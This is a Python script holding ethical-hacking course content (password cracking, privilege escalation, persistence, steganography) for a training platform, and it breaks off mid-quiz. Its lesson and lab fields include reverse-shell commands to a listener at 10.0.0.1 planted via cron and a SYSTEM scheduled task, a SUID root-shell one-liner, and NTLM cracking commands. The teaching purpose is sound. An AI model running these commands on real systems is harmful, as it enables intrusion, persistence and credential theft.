import os

html_path = r'C:\Users\navee\OneDrive\Desktop\Greatcoder\CEHv13\ceh-platform\frontend\index.html'

payload = """
CONTENT['password-cracking'] = {
  eyebrow: 'Module 06 · Topic 1',
  title: 'Password Cracking',
  module: 'Phase 03: Penetration Tester',
  sub: 'Methods and tools for extracting plaintext passwords from hashed credentials.',
  objectives: ['Understand hash types and password storage mechanisms.', 'Differentiate between dictionary, brute force, and rainbow table attacks.', 'Utilize tools like Hashcat and John the Ripper to crack passwords.'],
  learn: {
    simple: 'Password cracking is the process of recovering passwords from data that has been stored in or transmitted by a computer system. Typically, this involves recovering a plaintext password from its hash. Attackers use various methods, such as guessing, dictionary attacks, brute force, or using precomputed hashes (rainbow tables).',
    analogy: 'Imagine a bouncer at a club who doesn\\'t know your name but has a list of ID numbers. If you show your ID, he runs it through a scanner that generates a specific code. He checks if that code is on his list. A password cracker tries every possible ID to see which one produces a code on the list.',
    architecture: 'Systems store passwords by running them through one-way cryptographic hash functions (like SHA-256 or NTLM). When a user logs in, the entered password is hashed and compared to the stored hash. Cracking involves obtaining the stored hash (e.g., from SAM database in Windows or /shadow file in Linux) and generating hashes of possible passwords until a match is found. Salting adds random data to the password before hashing, defeating rainbow tables.',
    why: 'Weak passwords and outdated hashing algorithms are major vectors for lateral movement. Understanding how quickly modern GPUs can crack hashes helps security teams enforce strong password policies and implement multi-factor authentication (MFA).'
  },
  enterprise: {
    gfs: 'During a Red Team engagement at Global Financial Services, analysts compromised a web server and dumped NTLM hashes, subsequently cracking a service account password to escalate privileges across the domain.',
    windows: 'Windows environments heavily rely on NTLM and Kerberos hashes. Dumping the SAM database or executing DCSync attacks allows attackers to offline crack domain credentials.',
    linux: 'In Linux, passwords are traditionally stored in /etc/shadow using hashing algorithms like SHA-512 (identifiable by $6$). Misconfigured sudo permissions often allow reading this file.'
  },
  workflow: ['Step 1: Identify the target hash and determine its type.', 'Step 2: Obtain a comprehensive wordlist (e.g., rockyou.txt).', 'Step 3: Define rule-based mutations for the dictionary attack.', 'Step 4: Launch Hashcat or John the Ripper targeting the specific hash format.', 'Step 5: Monitor the cracking progress and system resource utilization.', 'Step 6: Recover the plaintext password upon a successful hash collision.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="100" height="50" fill="#2d3748"/><text x="110" y="130" fill="white">Plaintext</text><path d="M200 125 L300 125" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="300" y="100" width="100" height="50" fill="#e53e3e"/><text x="315" y="130" fill="white">Hash Fn</text><path d="M400 125 L500 125" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="500" y="100" width="100" height="50" fill="#2d3748"/><text x="510" y="130" fill="white">Hash Value</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'hashcat -m 1000 hashes.txt wordlist.txt', purpose: 'Crack NTLM hashes', out: 'Cracked passwords', note: 'Requires strong GPU for efficiency', mistake: 'Using the wrong hash type (-m)' }
    ],
    win: [
      { cmd: 'hashcat.exe -a 0 -m 1000 hashes.txt rockyou.txt', purpose: 'Dictionary attack on NTLM hashes', out: 'Session.Name...: hashcat', note: 'Ensure proper OpenCL drivers are installed on Windows', mistake: 'Running in a low-resource VM environment' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Advanced',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Hashcat', 'John the Ripper', 'Metasploit'],
    dependencies: [],
    safety: ['Perform this lab only in an authorized environment.'],
    scenario: 'GFS requires an audit of service account passwords. You have obtained a list of NTLM hashes and must crack them to determine policy compliance.',
    objectives: ['Identify hash formats', 'Run a dictionary attack using Hashcat'],
    steps: ['Step 1: Inspect the hashes.txt file.', 'Step 2: Run `hashcat -m 1000 hashes.txt rockyou.txt`.', 'Step 3: Wait for the cracking process to finish and read the results.'],
    evidence: ['Terminal output showing cracked plaintext passwords.'],
    validation: ['You should see: The plaintext password associated with the NTLM hash.'],
    troubleshooting: ['If hashcat fails, try using John the Ripper (`john --format=NT hashes.txt`).'],
    mitre: [{ id: 'T1110.002', name: 'Password Cracking', tactic: 'Credential Access' }],
    cleanup: ['Remove the hashes.txt file and clear bash history.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which attack uses precomputed hashes?', opts: ['Brute Force', 'Dictionary', 'Rainbow Tables', 'Hybrid'], correct: 2, fb: 'Rainbow tables use precomputed chains of hashes to dramatically speed up cracking for unsalted hashes.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is the purpose of a salt in password hashing?', opts: ['Make the hash faster to compute', 'Prevent rainbow table attacks', 'Encrypt the password', 'Compress the hash'], correct: 1, fb: 'Salts add random data to each password before hashing, rendering precomputed rainbow tables useless.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'In Hashcat, what does the -m parameter specify?', opts: ['Attack mode', 'Hash type', 'Output file', 'Wordlist'], correct: 1, fb: 'The -m parameter tells Hashcat which hashing algorithm was used (e.g., 1000 for NTLM).' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'NTLM hashes are automatically salted by Windows.', opts: ['True', 'False'], correct: 1, fb: 'False. NTLM hashes are unsalted, making them vulnerable to rainbow table attacks.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which of the following hash formats is commonly found in Linux /etc/shadow files starting with $6$?', opts: ['MD5', 'SHA-256', 'SHA-512', 'bcrypt'], correct: 2, fb: 'The $6$ prefix indicates that the password was hashed using SHA-512.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a dictionary attack?', opts: ['Trying every possible character combination', 'Using a list of common words and passwords', 'Intercepting passwords over the network', 'Reversing the hash algorithm'], correct: 1, fb: 'Dictionary attacks iterate through a pre-defined list of likely passwords.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'Hashcat can utilize both CPU and GPU for cracking.', opts: ['True', 'False'], correct: 0, fb: 'True. Hashcat is optimized to use OpenCL and CUDA, allowing it to leverage powerful GPUs for significantly faster cracking.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which tool is often considered a standard for CPU-based password cracking?', opts: ['Nmap', 'John the Ripper', 'Wireshark', 'Metasploit'], correct: 1, fb: 'John the Ripper is a popular and versatile open-source password cracker, heavily used for CPU-based cracking.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What technique appends numbers or special characters to words in a dictionary during an attack?', opts: ['Rule-based attack', 'Mask attack', 'Brute force', 'Rainbow table'], correct: 0, fb: 'Rule-based attacks apply transformations (like capitalizing the first letter or adding numbers) to dictionary words.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'Where are local user hashes stored on a Windows system?', opts: ['/etc/shadow', 'Active Directory', 'SAM database', 'Registry hive HKCU'], correct: 2, fb: 'Local account hashes are stored in the Security Account Manager (SAM) database.' }
  ],
  flashcards: [
    { f: 'Hash Collision', b: 'Occurs when two different plaintext inputs produce the same hash output.' },
    { f: 'Salt', b: 'Random data added to a password before hashing to defend against precomputed attacks.' },
    { f: 'Rainbow Table', b: 'A large precomputed table used to reverse cryptographic hash functions, mostly effective against unsalted hashes.' }
  ],
  summary: ['Password cracking recovers plaintexts from hashes.', 'Salting prevents rainbow table attacks.', 'Hashcat and John the Ripper are primary tools.', 'GPU acceleration drastically speeds up cracking.', 'Strong policies and MFA mitigate this threat.'],
  outcomes: ['Understand hash storage mechanisms.', 'Deploy dictionary and brute force attacks.', 'Use Hashcat to crack NTLM hashes.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['privilege-escalation'] = {
  eyebrow: 'Module 06 · Topic 2',
  title: 'Privilege Escalation',
  module: 'Phase 03: Penetration Tester',
  sub: 'Gaining higher-level access from a compromised low-privileged account.',
  objectives: ['Differentiate between vertical and horizontal privilege escalation.', 'Identify and exploit Windows UAC bypasses.', 'Exploit Linux SUID binaries and misconfigured sudoers.'],
  learn: {
    simple: 'Privilege escalation happens when an attacker gains access to rights or privileges beyond what is intended for a user. Once initial access is gained (often as a standard user), the attacker looks for misconfigurations, vulnerabilities, or weak permissions to elevate their access to Administrator or root.',
    analogy: 'Imagine sneaking into an office building as a guest. You have a visitor badge that lets you into the lobby. By finding an unattended security desk or exploiting a broken lock on a staff door, you manage to grab a master key, giving you access to the entire building.',
    architecture: 'In an OS, processes run with the permissions of the user who started them. Privilege escalation often involves manipulating a privileged process (running as SYSTEM or root) into executing attacker-controlled code. This can be achieved through DLL hijacking, unquoted service paths, exploiting kernel vulnerabilities, or abusing SUID bits in Linux, where a binary executes with the permissions of its owner rather than the caller.',
    why: 'Low-privileged access limits an attacker\\'s ability to move laterally, install persistent backdoors, or access sensitive data. Defenders must understand escalation paths to properly harden systems, implement least privilege, and monitor for unauthorized privilege elevation.'
  },
  enterprise: {
    gfs: 'A GFS workstation was compromised via a phishing email. The attacker operated as a standard user but escalated to SYSTEM by exploiting an unquoted service path in a legacy financial application.',
    windows: 'Windows escalation often targets User Account Control (UAC) bypasses, weak service permissions, AlwaysInstallElevated registry keys, or credential dumping (e.g., Mimikatz).',
    linux: 'Linux escalation typically involves exploiting kernel flaws (e.g., Dirty COW), cron jobs running as root, or abusing binaries with the SUID bit set or overly permissive sudo rules.'
  },
  workflow: ['Step 1: Enumerate system information (OS version, architecture).', 'Step 2: List current user privileges and group memberships.', 'Step 3: Search for misconfigured services, scheduled tasks, or cron jobs.', 'Step 4: Check for SUID binaries (Linux) or weak registry permissions (Windows).', 'Step 5: Exploit identified vulnerabilities to execute code as root/SYSTEM.', 'Step 6: Verify the elevated access level.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="200" y="250" width="200" height="50" fill="#4a5568"/><text x="230" y="280" fill="white">Standard User</text><path d="M300 250 L300 150" stroke="#e53e3e" stroke-width="3" stroke-dasharray="5,5" marker-end="url(#arrow)"/><rect x="200" y="100" width="200" height="50" fill="#c53030"/><text x="240" y="130" fill="white">SYSTEM / root</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'find / -perm -4000 -type f 2>/dev/null', purpose: 'Find SUID binaries', out: '/usr/bin/passwd\\n/usr/bin/sudo', note: 'Look for non-standard binaries like nmap or vim with SUID set', mistake: 'Running without 2>/dev/null, cluttering output with Permission Denied errors' }
    ],
    win: [
      { cmd: 'accesschk.exe -uwcqv "Authenticated Users" *', purpose: 'Find vulnerable services', out: 'RW VulnerableService', note: 'Requires Sysinternals suite', mistake: 'Not checking effective permissions' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Advanced',
    duration: '45',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['LinPEAS', 'WinPEAS', 'Metasploit'],
    dependencies: [],
    safety: ['Perform this lab only in an authorized environment.'],
    scenario: 'You have gained shell access to a GFS server as a low-privileged user. You must escalate privileges to root to secure the server.',
    objectives: ['Enumerate the system', 'Exploit a SUID binary to gain a root shell'],
    steps: ['Step 1: Run `find / -perm -4000 -type f 2>/dev/null`.', 'Step 2: Identify `cpulimit` in the output.', 'Step 3: Exploit using `cpulimit -l 100 -f -- /bin/sh -p`.'],
    evidence: ['Terminal output showing `uid=0(root)`.'],
    validation: ['You should see: The root prompt (`#`) and `id` showing root.'],
    troubleshooting: ['If the exploit fails, verify the SUID bit is set (`ls -l`).'],
    mitre: [{ id: 'T1068', name: 'Exploitation for Privilege Escalation', tactic: 'Privilege Escalation' }],
    cleanup: ['Exit the root shell.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is vertical privilege escalation?', opts: ['Accessing resources of another user with the same privileges', 'Gaining higher privileges, such as moving from standard user to Administrator', 'Moving laterally across the network', 'Downgrading privileges to evade detection'], correct: 1, fb: 'Vertical escalation involves moving from a lower privilege level to a higher one.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is horizontal privilege escalation?', opts: ['Accessing resources of another user with the same privilege level', 'Gaining administrative rights', 'Bypassing the firewall', 'Cracking passwords'], correct: 0, fb: 'Horizontal escalation occurs when a user accesses data or functions of another user who has similar access rights.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'In Linux, what does the SUID bit allow?', opts: ['Execution of a file with the permissions of the file owner', 'Write access to everyone', 'Hiding the file from ls', 'Encrypting the executable'], correct: 0, fb: 'SUID (Set owner User ID up on execution) allows a program to run with the privileges of its owner, often root.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which Windows feature is commonly bypassed to execute tasks with elevated privileges without prompting the user?', opts: ['Windows Defender', 'User Account Control (UAC)', 'BitLocker', 'AppLocker'], correct: 1, fb: 'UAC is designed to prevent unauthorized changes, but numerous bypass techniques allow silent elevation.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'An unquoted service path vulnerability occurs when a service path contains spaces and is not enclosed in quotes.', opts: ['True', 'False'], correct: 0, fb: 'True. Windows will attempt to execute every word before a space as a program (e.g., C:\\\\Program.exe) if the path lacks quotes.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'Which tool is widely used to automate the enumeration of Windows systems for privilege escalation vectors?', opts: ['Nmap', 'WinPEAS', 'Wireshark', 'Burp Suite'], correct: 1, fb: 'WinPEAS (Windows Privilege Escalation Awesome Scripts) searches for all known Windows privilege escalation paths.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'How can misconfigured cron jobs lead to privilege escalation in Linux?', opts: ['They execute scripts periodically as root; if writable by a standard user, they can execute malicious code.', 'They automatically crack passwords.', 'They disable the firewall.', 'They grant sudo rights to everyone.'], correct: 0, fb: 'If a cron job runs as root and executes a file writable by a lower-privileged user, the user can modify it to gain root execution.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'The AlwaysInstallElevated registry key, if set, allows any user to install MSI packages with SYSTEM privileges.', opts: ['True', 'False'], correct: 0, fb: 'True. This is a common misconfiguration that allows immediate privilege escalation via a malicious MSI.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'Which command displays your current username and group privileges in Linux?', opts: ['whoami /priv', 'id', 'ipconfig', 'ls -la'], correct: 1, fb: 'The `id` command shows the real and effective user and group IDs.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a common method for Linux privilege escalation using sudo?', opts: ['Exploiting the Dirty COW kernel vulnerability', 'Running `sudo -l` to find commands allowed without a password and exploiting them (e.g., sudo vim)', 'Cracking the /etc/shadow file', 'Overwriting the /bin/bash binary'], correct: 1, fb: 'Misconfigured sudo rules often allow running specific commands as root, which can be abused to spawn a root shell (like using `!/bin/sh` in vim).' }
  ],
  flashcards: [
    { f: 'SUID', b: 'Set User ID; a Linux file permission that executes a file with the owner\\'s privileges.' },
    { f: 'UAC Bypass', b: 'Techniques used to elevate privileges on Windows without triggering the User Account Control prompt.' },
    { f: 'Unquoted Service Path', b: 'A Windows vulnerability where a service executable path contains spaces and lacks quotes, allowing a malicious executable to run instead.' }
  ],
  summary: ['Vertical escalation means gaining higher rights.', 'Horizontal escalation means accessing peer accounts.', 'Windows targets include UAC, services, and registries.', 'Linux targets include SUID, sudo, and cron jobs.', 'Enumeration is critical for finding misconfigurations.'],
  outcomes: ['Identify privilege escalation vectors.', 'Exploit SUID binaries.', 'Perform a UAC bypass.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['maintaining-access'] = {
  eyebrow: 'Module 06 · Topic 3',
  title: 'Maintaining Access',
  module: 'Phase 03: Penetration Tester',
  sub: 'Techniques to establish persistence and survive reboots or credential changes.',
  objectives: ['Understand the purpose of persistence mechanisms.', 'Implement backdoors and rootkits.', 'Utilize scheduled tasks and registry keys for persistence in Windows.'],
  learn: {
    simple: 'Maintaining access (persistence) ensures an attacker does not lose control of a compromised system if it reboots, changes IP, or if user passwords are changed. It involves placing hidden mechanisms (backdoors) that automatically execute the attacker\\'s payload.',
    analogy: 'Imagine a burglar breaking into a house. Instead of having to pick the lock every time they want to return, they secretly unlock a back window or make a copy of the key. Persistence is leaving that window open.',
    architecture: 'Persistence mechanisms hook into the operating system\\'s natural startup or execution flows. In Windows, this includes the Registry (Run/RunOnce keys), Scheduled Tasks, Services, and WMI event subscriptions. In Linux, it involves SSH authorized_keys, cron jobs, modifying startup scripts (.bashrc), or deploying kernel-level rootkits to hide processes and network connections.',
    why: 'Advanced Persistent Threats (APTs) rely on deep persistence to remain in networks for months or years. Identifying persistence mechanisms is the core of incident response and threat hunting.'
  },
  enterprise: {
    gfs: 'During a compromise at GFS, threat actors maintained access for six months by embedding a malicious payload in a scheduled task named "Windows Update Check".',
    windows: 'Windows offers numerous persistence vectors, including modifying the HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run registry key, creating malicious services, or using Alternate Data Streams (ADS).',
    linux: 'Linux persistence often involves placing a backdoor SSH key in ~/.ssh/authorized_keys, modifying cron jobs, or installing a Loadable Kernel Module (LKM) rootkit.'
  },
  workflow: ['Step 1: Achieve initial access and elevate privileges.', 'Step 2: Choose a persistence method appropriate for the OS.', 'Step 3: Transfer the persistent payload or backdoor.', 'Step 4: Configure the system to execute the payload automatically (e.g., on boot or user login).', 'Step 5: Verify the persistence mechanism works.', 'Step 6: Obfuscate the backdoor to evade detection.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="150" height="50" fill="#2d3748"/><text x="120" y="130" fill="white">System Boot</text><path d="M250 125 L350 125" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="350" y="100" width="150" height="50" fill="#e53e3e"/><text x="365" y="130" fill="white">Registry/Cron</text><path d="M425 150 L425 200" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="350" y="200" width="150" height="50" fill="#2d3748"/><text x="375" y="230" fill="white">Execute Payload</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'echo "* * * * * /bin/bash -c \\'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\\'" | crontab -', purpose: 'Add a reverse shell cron job', out: 'crontab: installing new crontab', note: 'Executes every minute', mistake: 'Overwriting existing crontab instead of appending' }
    ],
    win: [
      { cmd: 'schtasks /create /tn "Updater" /tr "C:\\\\payload.exe" /sc onlogon /ru System', purpose: 'Persistence via Scheduled Task', out: 'SUCCESS: The scheduled task "Updater" has successfully been created.', note: 'Common APT persistence mechanism', mistake: 'Creating a task under a standard user account instead of SYSTEM' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Advanced',
    duration: '45',
    platform: 'Windows Server',
    environment: 'Local Lab',
    tools: ['PowerShell', 'Metasploit'],
    dependencies: [],
    safety: ['Perform this lab only in an authorized environment.'],
    scenario: 'You need to ensure continued access to a compromised Windows server at GFS across reboots.',
    objectives: ['Create a persistent scheduled task', 'Modify registry for persistence'],
    steps: ['Step 1: Open a privileged shell.', 'Step 2: Run `schtasks /create /tn "WinUpdate" /tr "C:\\\\Windows\\\\Temp\\\\nc.exe -e cmd.exe 10.0.0.1 4444" /sc onstart /ru SYSTEM`.', 'Step 3: Reboot the machine and catch the shell on your listener.'],
    evidence: ['Terminal output showing successful task creation and connection received.'],
    validation: ['You should see: A reverse shell connection upon reboot.'],
    troubleshooting: ['If the shell fails, check if the payload exists at the specified path and AV is disabled.'],
    mitre: [{ id: 'T1053', name: 'Scheduled Task/Job', tactic: 'Persistence' }],
    cleanup: ['Run `schtasks /delete /tn "WinUpdate" /f`.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is the primary goal of maintaining access?', opts: ['To crack passwords faster', 'To ensure continued control over a compromised system', 'To crash the target server', 'To encrypt all files on the drive'], correct: 1, fb: 'Maintaining access (persistence) ensures attackers don\\'t lose their foothold after reboots or connection drops.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which of the following is a common Windows registry key used for persistence?', opts: ['HKLM\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run', 'HKCU\\\\System\\\\Services', 'HKLM\\\\Hardware\\\\Description', 'HKCR\\\\.exe'], correct: 0, fb: 'The Run key automatically executes specified programs when a user logs in.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What is a rootkit?', opts: ['A tool used to crack the root password', 'Malware designed to hide the existence of certain processes or programs from normal methods of detection', 'A script that automates privilege escalation', 'A type of ransomware'], correct: 1, fb: 'Rootkits operate at a deep level (often kernel level) to hide malicious activity from the OS and security tools.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'Creating a Scheduled Task in Windows requires Administrator privileges.', opts: ['True', 'False'], correct: 1, fb: 'False. Standard users can create scheduled tasks, though they run with standard user privileges.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What is WMI Event Subscription used for in the context of persistence?', opts: ['Monitoring network traffic', 'Executing payloads automatically when a specific OS event occurs without dropping a file to disk', 'Cracking Wi-Fi passwords', 'Bypassing UAC'], correct: 1, fb: 'WMI persistence is a fileless technique that triggers actions based on system events, making it stealthy.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which Linux file is commonly modified to add persistence via SSH keys?', opts: ['/etc/passwd', '/etc/shadow', '~/.ssh/authorized_keys', '/var/log/auth.log'], correct: 2, fb: 'Adding an attacker\\'s public key to authorized_keys allows them to SSH into the account without a password.' },
    { type: 'true-false', difficulty: 'Advanced', q: 'Alternate Data Streams (ADS) in Windows can be used to hide a payload inside a legitimate file.', opts: ['True', 'False'], correct: 0, fb: 'True. NTFS ADS allows data to be attached to a file without altering its visible size or content.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What command creates a scheduled job in Linux?', opts: ['schtasks', 'cron', 'crontab', 'at'], correct: 2, fb: 'The `crontab` command manages cron jobs, a common method for Linux persistence.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'A backdoor that listens on a port waiting for a connection from the attacker is called a:', opts: ['Reverse shell', 'Bind shell', 'Web shell', 'Rootkit'], correct: 1, fb: 'A bind shell opens a port on the victim and waits for incoming connections, unlike a reverse shell which connects back to the attacker.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Which of the following is NOT a common persistence mechanism?', opts: ['Adding a user account', 'Modifying startup scripts', 'Running a port scan', 'Creating a malicious service'], correct: 2, fb: 'Port scanning is for reconnaissance, not for maintaining access.' }
  ],
  flashcards: [
    { f: 'Rootkit', b: 'Malware designed to hide processes, files, or network connections from the OS.' },
    { f: 'Cron Job', b: 'A time-based job scheduler in Linux, often abused for persistence.' },
    { f: 'Bind Shell', b: 'A backdoor where the victim machine opens a port and waits for the attacker to connect.' }
  ],
  summary: ['Persistence survives reboots and password changes.', 'Windows relies on Registry, Services, and Tasks.', 'Linux relies on cron, SSH keys, and bash scripts.', 'Rootkits provide deep, stealthy persistence.', 'Fileless techniques (WMI) evade basic AV detection.'],
  outcomes: ['Understand persistence concepts.', 'Configure Windows registry run keys.', 'Create Linux cron jobs for reverse shells.'],
  meta: { contentVersion: "1.0.0", estimatedTime: 45, difficulty: "Advanced", prerequisites: [], lastReviewed: "2026-07-18" }
};

CONTENT['steganography'] = {
  eyebrow: 'Module 06 · Topic 4',
  title: 'Steganography',
  module: 'Phase 03: Penetration Tester',
  sub: 'Hiding data within other files to covertly exfiltrate information or deploy payloads.',
  objectives: ['Understand the concept and purpose of steganography.', 'Perform LSB (Least Significant Bit) insertion.', 'Utilize tools like Steghide to conceal and extract data.'],
  learn: {
    simple: 'Steganography is the art of hiding a secret message within an ordinary, non-secret file or message. Unlike encryption, which scrambles the message, steganography hides the very existence of the message. In cyber defense, it is often used by attackers to hide malicious code in images or exfiltrate data without triggering DLP (Data Loss Prevention) systems.',
    analogy: 'Encryption is like writing a letter in an uncrackable secret language; everyone knows it\\'s a secret, but no one can read it. Steganography is like writing the secret message in invisible ink on the back of a mundane grocery list; no one even suspects there is a secret.',
    architecture: 'Digital steganography often uses the Least Significant Bit (LSB) technique. In an image, each pixel is represented by bytes denoting color (e.g., RGB). By altering the last bit of these bytes, an attacker can embed data. Because the change is so minor, the human eye cannot detect the alteration in the image. The same principles apply to audio files and video.',
    why: 'Steganography is increasingly used in advanced malware delivery and covert C2 (Command and Control) channels. Security analysts must understand how to detect anomalies and perform steganalysis to identify hidden threats.'
  },
  enterprise: {
    gfs: 'An insider threat at GFS attempted to steal client PII by hiding the data within corporate logo image files and emailing them to an external account.',
    windows: 'Attackers may use tools like OpenStego or command-line tricks (like `copy /b`) to append malicious executables to legitimate image or document files.',
    linux: 'Linux environments frequently utilize powerful command-line tools like Steghide or ExifTool to embed and extract hidden data within JPEG or WAV files.'
  },
  workflow: ['Step 1: Select a carrier file (e.g., an image or audio file).', 'Step 2: Prepare the secret payload or data to be hidden.', 'Step 3: Choose a steganography tool (e.g., Steghide).', 'Step 4: Embed the secret data into the carrier file, optionally encrypting it with a passphrase.', 'Step 5: Transmit the stego-object.', 'Step 6: Use the same tool and passphrase to extract the data on the receiving end.'],
  diagram: {
    caption: 'Click to interact with the diagram',
    svg: '<svg viewBox="0 0 600 400" xmlns="http://www.w3.org/2000/svg"><rect x="100" y="100" width="100" height="50" fill="#2d3748"/><text x="110" y="130" fill="white">Carrier (Img)</text><rect x="100" y="200" width="100" height="50" fill="#e53e3e"/><text x="110" y="230" fill="white">Secret Data</text><path d="M200 150 L300 175" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="300" y="150" width="100" height="50" fill="#4a5568"/><text x="310" y="180" fill="white">Stego Tool</text><path d="M400 175 L500 175" stroke="white" stroke-width="2" marker-end="url(#arrow)"/><rect x="500" y="150" width="100" height="50" fill="#2d3748"/><text x="510" y="180" fill="white">Stego-Object</text></svg>'
  },
  commands: {
    lin: [
      { cmd: 'steghide embed -cf image.jpg -ef secret.txt', purpose: 'Hide a text file in an image', out: 'embedding "secret.txt" in "image.jpg"... done', note: 'Will prompt for a passphrase', mistake: 'Using a carrier file that is too small for the payload' }
    ],
    win: [
      { cmd: 'copy /b image.jpg + payload.exe newimage.jpg', purpose: 'Append data to an image file', out: '1 file(s) copied.', note: 'Basic technique, easily detected by analyzing file structure', mistake: 'Messing up the order of files, breaking the image header' }
    ]
  },
  lab: {
    type: 'guided',
    difficulty: 'Intermediate',
    duration: '30',
    platform: 'Kali Linux',
    environment: 'Local Lab',
    tools: ['Steghide', 'ExifTool'],
    dependencies: [],
    safety: ['Perform this lab only in an authorized environment.'],
    scenario: 'You intercepted an image file leaving the GFS network and suspect it contains exfiltrated data. You must analyze and extract the hidden information.',
    objectives: ['Embed data in an image', 'Extract hidden data from an image'],
    steps: ['Step 1: Create a secret file: `echo "Confidential Data" > secret.txt`.', 'Step 2: Hide it: `steghide embed -cf logo.jpg -ef secret.txt`.', 'Step 3: Extract it: `steghide extract -sf logo.jpg`.'],
    evidence: ['Terminal output showing the extracted text.'],
    validation: ['You should see: The contents of secret.txt successfully recovered.'],
    troubleshooting: ['Ensure steghide is installed (`apt install steghide`).'],
    mitre: [{ id: 'T1027.003', name: 'Steganography', tactic: 'Defense Evasion' }],
    cleanup: ['Delete the created secret.txt and modified logo.jpg.']
  },
  quiz: [
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'What is the primary difference between cryptography and steganography?', opts: ['Cryptography hides the message existence; steganography encrypts it.', 'Cryptography scrambles the message; steganography hides its existence.', 'Cryptography is for images; steganography is for text.', 'There is no difference.'], correct: 1, fb: 'Cryptography obscures the meaning of a message, while steganography obscures the existence of the message entirely.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'What does LSB stand for in the context of steganography?', opts: ['Left Side Bit', 'Least Significant Bit', 'Log System Backup', 'Logical Security Barrier'], correct: 1, fb: 'LSB is a technique where the least important bit of data (e.g., color values in a pixel) is altered to store hidden data.' },
    { type: 'multiple-choice', difficulty: 'Beginner', q: 'Which tool is commonly used on Linux to embed data within JPEG and WAV files?', opts: ['Nmap', 'Metasploit', 'Steghide', 'Wireshark'], correct: 2, fb: 'Steghide is a popular command-line tool for hiding data in images and audio.' },
    { type: 'true-false', difficulty: 'Intermediate', q: 'The `copy /b` command in Windows is an advanced cryptographic steganography method.', opts: ['True', 'False'], correct: 1, fb: 'False. `copy /b` simply appends data to the end of a file; it is not cryptographic and is easily detectable.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'What is steganalysis?', opts: ['The process of encrypting images.', 'The process of detecting hidden messages within files.', 'A type of malware.', 'A network scanning technique.'], correct: 1, fb: 'Steganalysis is the study of detecting messages hidden using steganography.' },
    { type: 'multiple-choice', difficulty: 'Intermediate', q: 'Why do attackers use steganography?', opts: ['To make their malware execute faster.', 'To bypass Data Loss Prevention (DLP) filters by hiding exfiltrated data in legitimate-looking files.', 'To exploit a buffer overflow.', 'To crack passwords.'], correct: 1, fb: 'By hiding data in innocuous files, attackers can sneak data past network defenses and DLP solutions.' },
    { type: 'true-false', difficulty: 'Beginner', q: 'Steganography can only be used on image files.', opts: ['True', 'False'], correct: 1, fb: 'False. Data can be hidden in audio, video, text files, and even network protocols.' },
    { type: 'multiple-choice', difficulty: 'Advanced', q: 'When embedding data into an image using LSB, what happens to the image visually?', opts: ['It becomes completely distorted.', 'It turns black and white.', 'The changes are generally imperceptible to the human eye.', 'The file size doubles.'], correct: 2, fb: 'LSB only alters the smallest value bits, so the color shifts slightly but remains visually identical.' },
